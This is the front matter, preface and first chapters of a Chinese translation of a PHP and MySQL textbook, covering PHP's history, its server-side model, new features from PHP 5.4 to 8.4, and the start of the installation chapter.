# PHP 和 MySQL 全面指南





![](img/ae7820c36e8f24c1623d26668b28e80e_0_0.png)

```php
<?php
$number = "";
$binary = "";
if ($_GET["Send"] == "Convert") {
    $number = $_GET["input"];
    $binary_values = array();
    for ($i = 7; $i >= 0; $i--) {
        if ($number & pow(2, $i)) {
            $binary_values[$i] = 1;
        } else {
            $binary_values[$i] = 0;
        }
    }
}
```

- HTML, 变量
- 运算符, 控制结构
- 条件语句
- 循环, 函数
- 字符串, 数组
- 日期和时间
- 正则表达式

![](img/ae7820c36e8f24c1623d26668b28e80e_0_1.png)

## 探索更多 Rheinwerk Computing 图书馆内容！

- Philip Ackermann
  **JavaScript：全面指南**
  2022 年，982 页，平装本和电子书
  www.rheinwerk-computing.com/5554

- Philip Ackermann
  **全栈 Web 开发：全面指南**
  2023 年，740 页，平装本和电子书
  www.rheinwerk-computing.com/5704

- Jürgen Wolf
  **HTML 和 CSS：全面指南**
  2023 年，814 页，平装本和电子书
  www.rheinwerk-computing.com/5695

- Sebastian Springer
  **Node.js：全面指南**
  2022 年，834 页，平装本和电子书
  www.rheinwerk-computing.com/5556

- Sebastian Springer
  **React：全面指南**
  2024 年，676 页，平装本和电子书
  www.rheinwerk-computing.com/5705


![](img/ae7820c36e8f24c1623d26668b28e80e_2_0.png)

# 前言

> 我从未将 PHP 视为解决问题的简单工具以上。¹
> – Rasmus Lerdorf（PHP 发明者）

在 2013 年 Google I/O 大会上，一位演讲者宣布，超过 75% 的所有网站都依赖 PHP。² W3Techs 网站经常给出类似范围的数据，2024 年初约为 76.5%。³ 这令人印象深刻，也是当之无愧的：PHP 可以做很多事情，正如我们将在本书中展示的那样。

然而，PHP 的主导地位也意味着关于 PHP 的出版物和书籍形成了令人困惑的丛林；也许你的书架上已经有一两本相关作品。那么，为什么还要另一本关于 PHP 的书呢？

我们想引用两个原因。首先，本书在德语中已出版五个版本，现在首次提供英文版。所有内容都已使用新的 PHP 8.3 版本进行了测试，但之前德语版本的读者也会发现许多有用的信息。我们在许多地方更新了代码以包含新的语言特性，但基本解释通常也适用于早期版本。

第二个原因是，我们选择了与许多其他书籍略有不同的概念，因为基于众多培训课程和会议演示以及我们从众多客户项目中积累的经验，我们认为 PHP 这个话题需要以一种特殊的方式来呈现。众多测试者的积极反馈鼓励我们，希望我们已经提出了一个连贯而合理的概念。

### 书籍材料

本书的所有清单都可在本书的网页上下载。要访问此内容，首先访问 www.rheinwerk-computing.com/6022。接下来，向下滚动到“产品补充”框，然后单击“补充列表”。您将看到可下载的文件及其简要内容描述。单击“下载”按钮开始下载。根据文件大小（以及您的互联网连接速度），下载完成可能需要一些时间。

- 1 于 X（原 Twitter）发布。阅读请访问 http://s-prs.co/v602201。

- 2 此处等处复述：http://s-prs.co/v602202。

- 3 参见 http://s-prs.co/v602203。

## 理念

本书的每一章都涉及一种特定的技术或问题，这些问题可以并且将用 PHP 解决。在每一章的开头，我们都会展示必要的安装步骤。这意味着您不必在书中来回翻找以查找特定任务的安装步骤；相反，这些步骤始终包含在相应的章节中。例外情况是 PHP 的一般安装，您可以在单独的章节（确切地说，第 2 章）中找到。

接下来是理论：您将学习 PHP 在本章主题方面所能提供的一切。但是，我们不仅仅局限于解释某事理论上如何工作；我们总是用代码示例来支持这一点。我们并非随意写下代码，而是在多个实例中测试了这些示例。这意味着，尽管我们并非对可能的错误免疫，但我们已经测试了每个清单。

理论后面通常是实践，本书也不例外。我们认为，简单、清晰的示例非常适合解释事物，但经常会出现这样一种疑问：这实际上是否可用于实践？因此，在许多章节中，都有一个“应用示例”部分，我们在其中展示一个或多个略微复杂的应用程序，它们比前面的代码片段具有更高的实际相关性。当然，我们不希望在这些部分中过分深入，并且仍然专注于要点。所以不要指望复杂的精致 CSS 样式或大量的 HTML；本书主要是关于 PHP 的。

PHP 拥有出色的在线手册。您可以在 www.php.net/manual 上以包括英语在内的多种语言找到它。有一个特别巧妙的快捷方式：如果您对 PHP 编程命令有疑问，只需在网络浏览器中调用地址 http://php.net/<PHP term>。在大多数情况下，您将自动重定向到相应的手册页面，通常甚至是手册的英文版本。例如，在第 2 章中，您将了解一种称为 phpinfo() 的东西。图 1 显示了在网络浏览器中输入 http://php.net/phpinfo 时出现的页面，即所需信息。

PHP 在线手册也可供下载为 HTML 格式。当前版本还可供下载（位于 www.php.net/download-docs.php）为 CHM 格式，即 Windows 帮助格式，其他操作系统上也有显示程序。手册（如同在线手册一样）有多种语言版本（参见图 2）。但是，通常只有英文版本是完整且最新的。

![](img/ae7820c36e8f24c1623d26668b28e80e_25_0.png)

### 图 1 短网址，但信息量大

![](img/ae7820c36e8f24c1623d26668b28e80e_25_1.png)

### 图 2 Windows 帮助格式中的 PHP 手册

关于贯穿全书一致的章节结构，就这些。说到一致性，您会注意到本书中大多数图表都是在 Windows 操作系统上创建的。但这绝不意味着作者是微软的追随者，或者脚本仅在一个操作系统平台上使用过。相反，这与本书的制作流程有关：出版社的模板针对 Windows 进行了优化，因此我们也在 Windows 上创建了大多数图表。然而，我们使用了多个 Linux 和 Mac 系统，以便在那里测试代码，并发现和记录这些系统的特殊功能，特别是在安装部分。如果某事确实只在一个操作系统下工作，这始终会被标明。

还有另一个重要点：我们一直等到 PHP 8.3 最终发布后才完成本书，因此你不会在本书中找到任何过时的测试版代码。本书示例的最后测试甚至是用 PHP 8.3.4 运行的。这种耐心在许多之前的版本中得到了回报，因为次要版本中的细节一直在变化。

## 内容

本书分为七个部分，每个部分涉及特定的主题领域：

- 第一部分描述了使用 PHP 所需的准备工作。您将了解什么是 PHP 以及如何安装它。后者曾经是一个主要障碍，因此我们详细介绍了 Linux、macOS 和 Windows 的安装过程。

- 第二部分包含从零开始的完整 PHP 入门。当然，更高级的主题和 PHP 8.x 的新功能也有所涵盖。然后，您将拥有必要的知识，在随后的部分中使用 PHP 解决特定任务。

- 第三部分涉及主导每位专业 PHP 程序员日常工作的基本 Web 技术，尤其是在代理机构中，这些技术至关重要。您将学习如何使用表单、使用会话和 Cookie，以及从 PHP 发送电子邮件。

- 第四部分展示了数据库——不仅仅是常与 PHP 一起提及的 MySQL，还包括一系列其他数据库系统，如 SQLite、Microsoft SQL Server、PostgreSQL、Oracle 和 MongoDB。

- 第五部分解释了 PHP 如何与外部世界通信。这可以通过文件、HTTP、FTP 或 Web 服务等方式进行。我们还展示了与 JavaScript 和 WebSocket 的交互。

- 第六部分演示了如何使用 PHP 处理各种数据格式：JSON 和 XML 文件、图形，甚至 PDF 文档。

- 第七部分涉及通常发生在幕后的管理和安全相关主题。您将了解不当编程在 PHP 网站中创建安全漏洞是多么容易，以及您可以针对此类漏洞做些什么。您还将了解更多关于用户身份验证和 PHP 配置的信息。





## 关于 PHP 8.3 版

第 VIII 部分涉及更高级的主题，例如调试 PHP 代码和自动化测试。我们还介绍了 PHP 包管理的事实标准。最后，你将学习如何自行扩展 PHP。你可以通过为 PHP 编写自己的扩展，或者自行修正 PHP 中的错误来实现这一点。

PHP 7 于 2015 年底发布，是一个里程碑：自 2004 年发布 PHP 5 以来的第一个新“主”版本号（！；版本 6 被跳过）。然而，从纯功能角度来看，变化并不大。主要新特性包括 64 位支持和性能的显著提升——在某些情况下可提升 100%！这些改进无需额外费用即可使用。

在随后的 7.1 到 7.4 版本中，仍然有众多创新。PHP 已有 20 多年历史，尽管该语言成熟度很高，但总有可以改进或进行根本性变化的领域。向后兼容性是一项宝贵资产，但多年来明确不是好主意的结构正在逐渐被移除。

现在每年都会发布新的 PHP 版本，并且基本准时发布。2020 年 11 月的 PHP 8.0 是一个特殊版本。它不仅是五年来的第一个主要版本号，而且在许多方面都标志着一个转折点。除了性能改进和众多新特性外，还有许多大小不一的内部变化。在本书上一版（PHP 8.0 发布后不久出版）中，我们也删除了许多旧习惯，并更新、删除了或添加了大量代码示例。从那以后，PHP 的新子版本每年发布一次——PHP 8.3.0 于 2023 年 11 月 23 日发布。

PHP 8.1 到 8.3 版本中有许多激动人心的新特性和一些变化——足以彻底修订本书。除了小的变化外，本书的基本结构变化不大，但每一章都进行了重新处理，所有内容都是最新的。例如，我们展示了 Windows 下 PHP 的当前构建系统，使用当前库进行 PDF 生成，展示 PHP 所有相关的新语言特性，使用最新的库与半打数据库通信，还简要介绍了调试 PHP 应用程序和单元测试。我们相信，巨大的努力没有白费，你手中握着的是一本既经过验证、值得信赖，又与时俱进的著作。

关于某些现代语言特性，甚至在内部也存在争议性讨论。例如，PHP 已经有一段时间可以为变量指定固定类型。我们确实详细介绍了这些选项，但我们决定不在所有代码清单中全面使用这些特性。我们每天都能看到，一些开发者喜欢这些编程选项，而另一些人则忽略它们。此外，每一章都涉及 PHP 的特殊功能。我们不想分散对本书每一章核心概念的注意力，以使内容更易于理解和消化。

还有向后兼容性的问题，我们也不想完全忽视。诚然，我们发现 PHP 8.3 的一些新特性非常实用，以至于它们也进入了几个示例，但我们始终会指出这一点，以便可以将其回移植到旧版本 PHP。

说到示例，本书的所有代码清单都可以在产品补充部分找到，网址为 http://www.rheinwerk-computing.com/6022。

> **注意**
> PHP 8.4 在本书英文版翻译过程中发布。我们在文中多次提及它，但本书主要使用的版本是 PHP 8.3。我们进行了多次抽检，并在 PHP 8.4 下运行了许多代码示例。

## 支持

正因本书如此全面，且在多个地方进行了更新，我们依赖于您的支持。请告诉我们您喜欢哪些内容，可能缺少什么（尽管提供了 1,000 多页，但我们无法包含所有想要的内容），以及在新版本中应该有哪些不同。如果您在某个代码清单中遇到问题或对本书有疑问，请联系我们。或者访问我们作为合伙人的 Arrabiata Solutions GmbH 代理机构网站 (www.arrabiata.de)。作为数字代理机构，我们自然也在这里提供 PHP 开发服务。

本书这一版还带来了一段充满怀念的回顾：25 多年前，其中一位作者与当时新成立的 Galileo Press 出版社签署了第 1 号出版合同。这当然是一项冒险，但绝对值得。该出版社现在名为 Rheinwerk，但最初的一些团队成员仍在。本书的合同编号是 10,000。我们对 Rheinwerk 的发展感到兴奋，并为自己能在这其中发挥微小作用而感到自豪。

我们借此机会感谢所有提供反馈和勘误的德语版读者。我们感谢 Stefan Neuveind 审阅了本书英文版的稿件。现在：祝您在 PHP 的世界里玩得开心！

Christian Wenz 和 Tobias Hauser
慕尼黑和斯塔恩贝格，2025 年 1 月

# 第一部分

## 准备工作

# 第 1 章

# PHP 简介

在 PHP 漫长的发展历程中，第 8 版始终遵循持续改进的道路。与第 7 版一样，性能优化仍然是一个问题。还有许多新的、有用的且合乎逻辑的语言功能。

如果你想快速上手 PHP 及其新特性，本章将一目了然地展示 PHP 8 的所有重要更新。对于初学者，我们建议先了解 PHP 的概念。从前一版本到当前版本的变化也占据了更多篇幅，以便使此次版本升级更容易。不过，我们从 PHP 的历史和概念开始。

## 1.1 PHP 的历史

PHP 起源于 Rasmus Lerdorf 的一个爱好项目。最初名为 Personal Homepage Tools，由一系列 Lerdorf 用于记录其网站访问量的 Perl 脚本组成。这些脚本后来变成了 PHP/FI，代表 Personal Home Page/Forms Interpreter。Lerdorf 出于性能原因，不再使用 Perl 实现它，而是直接使用 C 语言。

PHP/FI 有第二个版本，于 1997 年 11 月发布。但到那时，Andi Gutmans 和 Zeev Suraski 已经参与了开发。当时两人是 Technion—以色列理工学院的学生，需要比 PHP/FI 更强大的解决方案来完成一个大学项目。

1998 年 6 月，PHP 3 的最终版本作为 Gutmans、Suraski 与 Lerdorf 的合作成果发布。此时名称发生了变化，开发工作越来越多地移交给 Gutmans 和 Suraski。

从那时起，直至当前版本（PHP 8），PHP 代表 PHP: Hypertext Preprocessor。这是 PHP 唯一正确的展开形式；你在文献中找到的所有其他变体都是错误的。¹

¹ PHP 因此是一个递归首字母缩写词，即长形式中又包含了缩写本身。这可能会让你绞尽脑汁，但如果你觉得有趣，那么你已经迈出了成为极客的第一步。

Lerdorf 本人在 PHP 社区中仍然非常活跃。在几年里，他奔波于各个演讲之间，之后从 2002 年到 2009 年在 Yahoo 工作，自 2012 年起一直在 Etsy 工作。

Gutmans 和 Suraski 与 Doron Gerstel 共同创立了 Zend 公司。这个名字由两位主人公的名字组成：Zeev 和 Andi。PHP 从第 4 版起基于 Zend 引擎。在 PHP 5 中，该引擎为第 2 版本号。PHP 7 再次对 Zend 引擎进行了彻底修订。Zend 引擎 3（曾用名 phpng）没有引入那么多新函数，但提供了巨大的性能提升。

然而，PHP 的历史并非仅由三个人书写。诚然，这三个人与 PHP 的成功紧密相关。但最终，正是庞大的开发者社区使 PHP 成为了今天的样子。

PHP 项目没有问题应对 Lerdorf、Gutmans 和 Suraski 例如现在仅极少参与开发，而且后两人已经离开 Zend 的事实。此前支持 PHP Windows 版本开发的 Microsoft（通过派遣开发人员并负责构建系统），于 2020 年中期宣布结束其官方 PHP 支持。社区也吸收了这一变化；PHP 8 的 Windows 版本甚至在官方发布前几个小时就已经发布。

> **注意**
> 如果你使用 PHP 并自行编写了扩展或其他有用的东西，请将其公开，无论是作为简单的 PHP 类、Packagist 上的包，甚至是官方扩展。如果 PHP 没有得到如此强大的支持并如此成功，其他服务器端技术肯定只能付费使用。因此，通过亲自支持它，你鼓励竞争，并从长远来看获得更好的产品。²

## 1.2 成功与承诺

如果 PHP 不那么成功，你可能就不会读这本书了。听听朋友之间的交谈。不时，他们会说：“我希望我的主页上有 XY。”通常的解决方案是：“为什么不用 PHP？”或者：“我使用 WordPress、TYPO3、Drupal、Shopware 或其他开源系统。我该如何扩展它？”这里的答案也是：“使用 PHP，系统就是用它编写的。”我们想说的是，PHP 几乎已经成为一个日常话题，一旦你掌握了 Web 编程的原理，就会遇到它。

² 诚然，这个论点很简单，整个问题当然可以在多篇博士论文中更详细地考察，但它仍然相当好地概括了我们的看法。





让事实不言自明。根据 SecuritySpace，几乎 50% 的所有 Apache 服务器都安装了 PHP 模块。最令人印象深刻的数据来自 W3Techs，其中 PHP 是服务器端编程语言的市场领导者，占比 79.1%（参见图 1.1）。现在，统计数据存在争议，但很明显，PHP 是市场领导者，并应用于各个细分领域，从入门级到高端系统。

![](img/ae7820c36e8f24c1623d26668b28e80e_33_0.png)

图 1.1 W3Techs 中的 PHP 分布

PHP 的优势显而易见：它已经包含在较小的托管套餐中，因此价格低廉。它还被中型公司在企业领域用于网站、商店系统、B2B 应用程序等。而且 PHP 甚至在最大型网站上也有使用。除了 Facebook、Disney、Lufthansa（拥有完整的票务系统）和 Boeing 等著名示例之外，许多其他公司也依赖 PHP。基于 PHP 的内容管理系统也证明了 PHP 的能力。例如，这些系统包括广为人知的开源项目，如 WordPress、

3 Facebook 本身也出于性能考虑，通过构建名为 HipHop 的自有 PHP 基础引擎为 PHP 做出了贡献。顺便说一句，它也是开源的，包括基于它的虚拟机（hhvm）。其极佳的性能反过来鼓励 Zend Engine 的开发人员在 PHP 7 中也实现了重大性能提升。

TYPO3 和 Shopware。甚至那些在企业网站上不使用 PHP 的公司，内部肯定也有一两个小型 PHP 解决方案。

## 1.3 PHP 的概念

对于所有很少涉及 Web 的人来说，基本模型有些陌生。但是，一旦你内化了它，你就能掌握它。

让我们来模拟一个案例。当你作为冲浪者访问网站时，你的浏览器会发送一个请求。这个请求通过 HTTP 发出。你指定的 URL 标识出请求所指向的 Web 服务器。因此，它接收请求，并识别出你想要一个 HTML 文件。它会在 HTTP 响应中将此文件发回给你（参见图 1.2）。

![](img/ae7820c36e8f24c1623d26668b28e80e_34_0.png)

图 1.2 客户端-服务器模型

我们将简要总结此过程中的最重要事实：

- Web 服务器是运行在服务器上的程序。
- 浏览器和 Web 服务器通过 HTTP 通信。
- Web 服务器可以传递的文档存储在服务器上。
- 每个文档都由一个 URL 标识。

现在 PHP 登场了。PHP 是一种服务器端技术。这意味着 PHP 在服务器上运行。相比之下，JavaScript 是客户端技术。JavaScript 由浏览器解释。这也是为什么 JavaScript 有时必须针对不同的浏览器进行不同的编程，而使用 PHP 时只需关注服务器上使用的版本即可。

让我们再次回顾前面的案例，但这次，你作为冲浪者调用一个 PHP 页面。我们从请求开始。URL 现在包含一个通常带有 .php 扩展名的文件。服务器看到文件扩展名，然后知道必须将

4 你不一定要将 .php 文件扩展名与 PHP 解释器关联起来；你可以选择任何其他文件扩展名。例如，有些公司使用 .html 来伪装他们正在使用 PHP 的事实。

文件传递给 PHP。PHP 接收文件并对其进行解释（或者更准确地说是编译）。这里的解释意味着 PHP 会遍历该文件（参见图 1.3）。PHP 代码在特别标记的 PHP 区域中执行。返回的结果是纯 HTML。Web 服务器接收结果，然后将其发送回浏览器。

![](img/ae7820c36e8f24c1623d26668b28e80e_35_0.png)

以下是再次列出的最重要事实：

- PHP 是一个挂钩到 Web 服务器的扩展。
- Web 服务器会转发带有特定文件扩展名的所有文件（通常为 .php；以前也包括 .php4 或 .php3）。
- 当调用 PHP 页面时，最终始终会向浏览器发送 HTML（以及可能的 CSS 和 JavaScript），但永远不会发送 PHP 代码。

服务器端技术的这一简单原则不仅适用于 PHP，也适用于其他服务器端技术。但是，通常会有一些特殊功能，例如中间应用程序服务器或像 .NET 那样翻译成中间语言。

> **注意**
> 
> 这一结果的一个含义是，服务器端代码非常安全，不会被无耻的窃贼访问。另一方面，JavaScript 无法防止未经授权的访问（即使某些保护程序声称否则）。因此，密码检查只能在服务器端进行。

## 1.4 PHP 8 到 8.4 中最重要的新功能

最新版本 PHP 8 及其子版本（目前为 PHP 8.4）主要关注一致性和整理工作。还添加了一些实用的新语言函数。而且，第一次，PHP 8 有一个设计精美的页面，展示了所有重要新功能的概述：https://www.php.net/releases/8.0，后来的版本也采用了此方式，例如 https://www.php.net/releases/8.4。

![](img/ae7820c36e8f24c1623d26668b28e80e_36_0.png)

图 1.4 PHP 8.4 的新功能

> **提示**
> 
> 如果你想深入了解 PHP 8 及更早版本背后创新的 PHP 核心开发人员的考虑和决策，可以在 PHP wiki 中找到功能提案 RFC，包括投票结果。对于 PHP 8，请参见 https://wiki.php.net/rfc#php_80；对于 PHP 8.4，请参见 https://wiki.php.net/rfc#php_84。

下面的列表概述了 PHP 8 最重要的新功能：

- PHP 现在包含一个即时编译（JIT）编译器。PHP 实际上是一种解释型编程语言；也就是说，它在调用时执行，而不是像编译型编程语言那样在执行前转换为机器代码。JIT 编译器是一种折中方案。它用于在适当的地方预编译代码，并与 PHP 8 中的代码缓存系统紧密协作。在许多应用程序中，付出的努力所换来的回报是性能提升，而没有功能劣势。
- 引入了全新的 match 语言结构，作为 switch case 区分的通常更简单的替代方案。有关此内容在第 5 章中详述。
- 命名参数允许访问函数和方法参数，而不考虑顺序。你可以在第 6 章中阅读更多相关内容。
- 联合类型通过允许为方法参数或其返回值定义多种类型来扩展类型系统。你也可以在第 6 章中阅读更多相关内容。
- 新的 mixed 类型充当任何类型的代表。诚然，如果你省略类型，这也是默认行为——但使用 mixed 你可以直接指定此行为，即使在严格类型下也不会得到类型错误。

PHP 8 还整理了内部类型，并修订了许多核心函数：

- PHP 内部函数现在在类型不正确时也会一致地返回 TypeError 错误。
- ?-> 空安全运算符大大简化了嵌套对象的空检查。
- 对于比较和位运算符，字符串与数字之间的比较已进行修订。
- PHP 8 允许参数列表末尾使用逗号，作为一种小的语法补充。

面向对象方面也有一些有趣的创新（参见第 11 章）：

- static 现在也被允许作为方法返回值的类型。
- 类构造函数新引入的属性提升功能，在构造函数中创建属性时省去了大量不必要的输入。
- 借助所谓的属性，PHP 8 引入了原生元数据，你也可以通过反射 API 在运行时访问它。这是其他注释选项（如 PHPDoc）的原生替代方案。
- 在 PHP 8 中，不再“不必要地”检查同名私有方法的继承。
- WeakMap 是 PHP 7.4 引入的“弱”引用的新标准类。
- PHP 8 自动将新的 Stringable 接口添加到使用 __toString() 的类中。
- 错误处理的趋势也朝着整洁方向发展：@ 运算符不再抑制致命错误。错误处理中的许多不一致之处已被消除，包括不合理的警告级别（https://wiki.php.net/rfc/engine_warnings）。现在 catch 块中也可以在没有变量定义的情况下使用 try-catch。
- 在字符串处理中，添加了三个函数：str_contains()、str_starts_with() 和 str_ends_with()。（另见第 7 章。）
- 数组处理领域中的 create_function() 和 each() 方法已被移除。
- 对于许多扩展，例如 GD 图形库或 XML 解析器，PHP 内部使用所谓的资源。这些资源在 PHP 8 中大多已转换为对象。并且，只要仍存在资源，get_resource_id() 就能实现转换为整数值。





以下是 PHP 8.x（最高至 8.4）中新增的重要函数的概述：

- 从 8.1 版本开始，PHP 允许为数字使用一种新的八进制表示法，即前面加 0，后面加 o。

- 自 PHP 8.1 起，PHP 允许具有固定数据值的枚举。关于此内容的更多信息，请参见第 6 章。

- PHP 8.1 新增了 never 关键字，用作函数的返回类型。自 PHP 8.2 起，null、false 和 true 也可用作类型，且 DNF 类型允许混合返回。有关这些主题的更多信息，请参见第 6 章。

- 自 PHP 8.2 起，针对数学函数引入了一个新的、好得多的 Random\Randomizer 类，有关内容请参见第 9 章。

- PHP 8.4 带来了新的 array_*() 函数。

- 在 PHP 8.4 中，DOM API 进行了完全重构。这包括对 HTML5 文档解析的标准合规支持。

面向对象编程中现在有一些新功能，这些功能一直在不断优化：

- PHP 8.1 添加了将属性声明为 readonly 的选项。PHP 8.2 则进一步在类级别支持 readonly。

- 自 PHP 8.1 起，对象还可用作静态变量、参数的默认值，以及属性的全局常量和参数。

- 在 PHP 8.1 中，动态设置的属性被归类为弃用。相反，可以通过设置名为 #[AllowDynamicProperties] 的属性来为特定类显式允许此类属性。

- 自 PHP 8.1 起，类中的常量也可以标记为 final。

- 自 PHP 8.3 起，常量也可以指定数据类型。

- 在 PHP 8.3 中，#[Override] 属性允许你标记一个方法，如其名称所示，该方法会重写另一个方法。

- PHP 8.1 添加了 fibers 作为一种新概念。它们允许在 PHP 中执行并行调用，因此是多线程的一种实现方式。有关更多信息，请参见第 26 章。

- 自 PHP 8.3 起，json_validate() 方法允许在解码之前验证 JSON 字符串。

- PHP 8.4 支持属性钩子。它们为属性提供了原生支持，使 IDE 和分析工具可以直接读取属性，而无需编写可能不同步的 DocBlock 注释。

- PHP 8.4 支持非对称可见性，即属性可以具有不同类型的可见性，例如读取时为 public，设置时为 private。

- 借助 PHP 8.4 中的 #[Deprecated] 属性，你可以为自己的方法、常量和函数使用弃用功能。

## 1.5 PHP 7.3 中最重要的功能

与之前的版本一样，PHP 7.3 相较于之前的 7.x 版本并未包含任何颠覆性变更。不过，应注意某些不兼容之处，一些新函数可能也会很有帮助：

- 从 PHP 7.0 到 7.1，函数“空”返回的处理方式已发生变化。如果返回值的数据类型前面加了 ?，则也可以返回零。但是，如果返回值指定为 void，则不允许返回零。

- 自 PHP 7.1 起，[] 数组简写形式也可以作为 foreach 等结构的基础。此变体仍与 list() 并存。同样自 PHP 7.1 起，简写符号和 list() 都允许使用命名索引。自 PHP 7.3 起，两者还允许使用 & 引用。

- 在 PHP 7.3 中，Heredoc 和 nowdoc 得到了简化，不再绝对要求结束标记必须换行且不带缩进。

- 自 PHP 7.2 起，php.ini 中可以不带文件扩展名调用扩展（Unix 中为 .so，Windows 中为 .dll）。

- 面向对象方面也做了一些调整：

  - 在 PHP 7.1 中，为方法参数添加了 iterable 伪类型，用于指示传入的对象是可遍历的——即已实现 Traversable 接口。

  - instanceof 运算符允许将字面量作为第一个操作数，结果为 false。

  - 自 PHP 7.1 起，可以使用 public、protected 和 private 关键字定义常量的可见性。

  - 自 PHP 7.2 起，函数参数有了新的 object 类型。

  - 自 PHP 7.2 起，将数组转换为对象时数值索引的处理方式已更改。

  - 借助 Closure 类的新静态 fromCallable() 方法，自 PHP 7.1 起可以将方法转换为 Closure 对象。

  - 自 PHP 7.2 起，抽象方法可以在继承的抽象类中被重写。

  - 自 PHP 7.2 起，重写的方法可以省略参数类型。

  - 在 PHP 7.2 中，现在有一种用于命名空间分组的语法，后跟逗号。

- 在异常处理中，PHP 7.1 已添加在 catch 块中使用管道字符 (|) 捕获多个异常的选项。

- 错误处理的另一个方面是，自 PHP 7.1 起，许多扩展越来越多地抛出错误异常，而不是较难管理的致命错误。这里有一长串需要提及：Date、DBA、IMAP、Intl、LDAP、Mcrypt、MySQLi、Reflection、Session、SimpleXML、SPL、Tidy、WDDX、XML-RPC 和 ZIP。这一趋势在后续版本中也得以保持；例如，PHP 7.3 为 BCMath 添加了新的错误处理。

- 自 PHP 7.1 起，在使用 [] 或 strpos() 访问字符串字符时，字符串处理中也支持负偏移量。

- 在安全方面，PHP 7.2 中 Sodium 密码学扩展成为核心的一部分。还添加了用于密码哈希的 Argon2。PHP 7.3 实现了用于密码生成的 Argon2id 支持。

- LDAP 函数不断得到扩展，包括新增参数和扩展操作 (EXOP)。

- PHP 7.3 对 mbstring 函数进行了略微扩展并针对性能进行了优化。最令人兴奋的功能创新是完整的大小写映射，例如会考虑到尖锐 S (ß)。在 PHP 7.1 中，一些正则表达式函数的错误处理得到了改进。

- 与往常一样，更多功能领域和库也在不断开发——例如 cURL、EXIF、Readline、SQLite3、PCRE 和 ZIP。

## 1.6 PHP 7 中最重要的功能

PHP 7 在新功能方面听起来像是一个巨大的飞跃。实际上，功能方面的跨度并不算太大，但基础引擎发生了变化：

- 速度
  PHP 核心完全重新开发背后最重要的目标是提高性能。其模型是 Facebook 使用的定制 PHP 实现。

- 旧特性与整理
  - ASP 语法中的短标签不再可用；php.ini 中不再有 asp_tags 设置。
  - 已移除使用 <script language="php"> 集成 PHP 代码的方式。
  - 魔术引号不再可用。
  - PHP 7 已放弃用于向后兼容的 E_STRICT 错误级别。相应的错误已分配到“普通”错误级别。
  - 在错误处理中，许多错误已提供异常，以便更好地进行错误处理。

- 语言和面向对象编程
  - <=> 太空船运算符允许在比较操作中进行三向比较。
  - 带有 null 检查的 ?? 条件运算符简化了烦人的 isset() 结构。
  - 使用 \u 可以将十六进制 Unicode 值转换为相应的 UTF-8 字符。

- 类型定义已得到扩展。首先，函数参数现在支持 int 和 float 等标量数据类型；其次，函数返回值现在也提供类型定义。

- 匿名类正在进入 PHP。

- 使用 `use` 导入的命名空间现在可以进行分组。

## 函数

- `intdiv()` 函数是新增的。它返回除法的整数商。

- 在 `list()` 函数中，值添加到变量的顺序已更改。顺序现在是变量定义的顺序。

## 扩展

扩展已经过整理，重复、过时和不再需要的扩展已被移除。例如，用于正则表达式的 `ereg` 以及用于数据库的 `mssql` 和 `mysql` 都被移除了。

## 1.7 PHP 5.4、5.5 和 5.6 中最重要的功能

PHP 5.6 的新功能并不算太多。因此，我们还列出了 PHP 5.4 和 5.5 相较于 5.3 的最重要新功能：

- 面向对象方面有多项创新：

- PHP 5.4 添加了 traits，允许在通用定义的方法中重用代码。

- 借助 PHP 5.4，可以直接在对象实例化时访问属性和方法。

- 在 PHP 5.5 中，可以使用 `::class` 读取包含命名空间的类名。

- 在 PHP 5.6 中，可以使用 `use` 关键字将常量等内容导入类中。

- 还有多项语言更改：

- PHP 5.4 为数组引入了一些新功能。其中，定义了一种基于 JSON 的简写语法。

- PHP 5.4 为数字定义了自己的二进制格式。

- PHP 5.5 添加了带有 `yield` 关键字的生成器，以便轻松遍历元素。

- 自 PHP 5.5 起，允许 `foreach` 与 `list()` 一起使用。

- 自 PHP 5.6 起，可以使用 `...` 运算符捕获函数或方法的多余参数。

- 自 PHP 5.6 起，同样的运算符可以用于将带参数的数组传递给函数。

- `**` 运算符自 PHP 5.6 起支持指数运算。




- 在 PHP 5.4 中，`<?=` 现在与 `php.ini` 中的 `short_open_tag` 选项独立。
- PHP 5.4 自带 CLI 模式下的开发 Web 服务器。
- PHP 5.6 现在允许上传大于 2GB 的文件。
- 扩展中也有一些变化：
  - 在 PHP 5.4 中，会话还可以跟踪文件的上传进度。
  - 在 PHP 5.5 中，GD 扩展补充了裁剪函数等功能。
  - PHP 5.5 添加了用于 Zend OPCode 缓存的 OPcache 扩展。
  - PHP 5.6 改进了 SSL/TLS 支持。
  - 在 PHP 5.6 中，pgsql 扩展扩展为包含异步连接。

一些函数也再次被声明为过时。其中包括旧的 MySQL 扩展 ext/mysql，它自 PHP 5.5 起 *已弃用*。在 PHP 5.6 中，`iconv` 和 `mbstring` 函数的编码信息也已被弃用，因为 `default_charset` 现在是确定字符集的官方主要方式。

> **注意**
> PHP 文档的附录（参见 http://php.net/manual/appendices.php）全面概述了所有新功能。

## 1.8 下载和文档

你可以在第 2 章中了解如何安装 PHP。获取 PHP 和查阅详尽在线文档的官方网站是 www.php.net。几乎没有其他开源项目能拥有如此出色的网站。甚至一些商业产品也可以从中学习。

> **注意**
> 注意新版本的更改日志，其中列出了对先前版本的重要更改。你应该在服务器上尽可能运行最新版本，因为安全漏洞也可能会被修复。但是，请提前测试你的脚本是否与新版本兼容。PHP 通常向下兼容，但 *通常* 遗憾的是不等于 *始终*。如果你的脚本运行在托管套餐中，你当然必须使用主机使用的版本。此版本也应该在你的工作站上运行。

# 第 2 章

# 安装

一切的开始……是安装。PHP 可以在几乎每个系统上运行，尽管安装过程存在差异，但所有系统上的基本配置都非常相似。

关于某项技术的大多数论坛问题都围绕其安装展开。PHP 也不例外。曾经有一段时间，它甚至比可比拟的脚本语言更糟糕。不过，现在有了修订版（英文）安装指南。本书在安装部分篇幅较大，以便你能在三个最重要的系统上快速上手，并在后续章节中不会遇到问题。

> 注意
> 如果你确实遇到重大困难，第 3 章将告诉你在哪里可以获取信息和帮助。

## 2.1 安装 PHP

PHP 是一种服务器端脚本语言。花点时间想象一下，当 PHP 用于驱动 Web 应用程序时会发生什么：浏览器请求一个包含 PHP 页面的 URL。Web 服务器随后识别出这是一个 PHP 页面，并将请求转发给 PHP 解释器。¹ 这为 Web 服务器提供 HTML，服务器将其发送到浏览器。

这对安装意味着什么？PHP 必须紧密集成到 Web 服务器中。图 2.1 显示了黑色中间层，即集成层。这种集成可以通过两种方式实现：

